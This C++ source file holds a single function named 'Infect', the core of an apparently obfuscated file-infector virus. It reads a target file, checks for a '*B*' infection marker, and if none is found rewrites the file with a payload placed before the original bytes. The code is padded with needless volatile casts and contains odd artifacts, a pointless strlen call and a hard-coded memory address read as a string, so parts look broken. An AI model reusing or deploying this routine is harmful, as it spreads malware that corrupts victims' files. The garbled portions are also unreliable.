#pragma optimize("", off)
#include "data_globals.h"
#include <fstream>
#include <cstring>
#include <cstdlib>

void Infect(char* filename, char* payload)
{
    volatile std::ifstream in_file_buf[2] = {std::ifstream(filename, std::ios::in | std::ios::binary), std::ifstream()};
    volatile std::ifstream *p_in_file = (volatile std::ifstream *)&in_file_buf[0];
    const_cast<std::ifstream&>(*p_in_file).seekg(0, std::ios::end);
    volatile std::streampos pos_buf[2] = {0, (std::streampos)0};
    volatile std::streampos *p_pos = (volatile std::streampos *)&pos_buf[0];
    // Use temporary, then assign to volatile with const_cast
    std::streampos temp_pos = const_cast<std::ifstream&>(*p_in_file).tellg();
    const_cast<std::streampos&>(*p_pos) = temp_pos;
    volatile int file_size_buf[2] = {0, (int)0};
    volatile int *p_file_size = (volatile int *)&file_size_buf[0];
    // Cast away volatile when reading *p_pos
    *p_file_size = static_cast<int>(const_cast<const std::streampos&>(*p_pos));
    const_cast<std::ifstream&>(*p_in_file).seekg(0, std::ios::beg);

    volatile char* Buffer_buf[2] = {static_cast<char*>(malloc(static_cast<size_t>(*p_file_size))), (char*)0};
    volatile char* *p_Buffer = (volatile char* *)&Buffer_buf[0];
    const_cast<std::ifstream&>(*p_in_file).read(const_cast<char*>(*p_Buffer), static_cast<std::streamsize>(*p_file_size));
    const_cast<std::ifstream&>(*p_in_file).close();

    volatile int j_buf[2] = {0, (int)0};
    volatile int *p_j = (volatile int *)&j_buf[0];
    for (*p_j = 0; *p_j < *p_file_size; ++(*p_j)) {
        if ((*p_Buffer)[*p_j] == '*' && (*p_Buffer)[*p_j + 1] == 'B' && (*p_Buffer)[*p_j + 2] == '*') {
            Status[0] = 'Y';
            Status[1] = 'E';
            Status[2] = 'S';
            Status[3] = '\0';
            break;
        }
    }

    if (strcmp(reinterpret_cast<const char*>(Status), "YES") != 0) {
        volatile std::ofstream out_file_buf[2] = {std::ofstream(filename, std::ios::out | std::ios::binary), std::ofstream()};
        volatile std::ofstream *p_out_file = (volatile std::ofstream *)&out_file_buf[0];
        const_cast<std::ofstream&>(*p_out_file) << payload;
        strlen(&inf);
        const_cast<std::ofstream&>(*p_out_file) << reinterpret_cast<const char*>(0x140008164);
        const_cast<std::ofstream&>(*p_out_file).write(const_cast<char*>(*p_Buffer), static_cast<std::streamsize>(*p_file_size));
        const_cast<std::ofstream&>(*p_out_file).close();
    }

    free(const_cast<char*>(*p_Buffer));
}
#pragma optimize("", on)
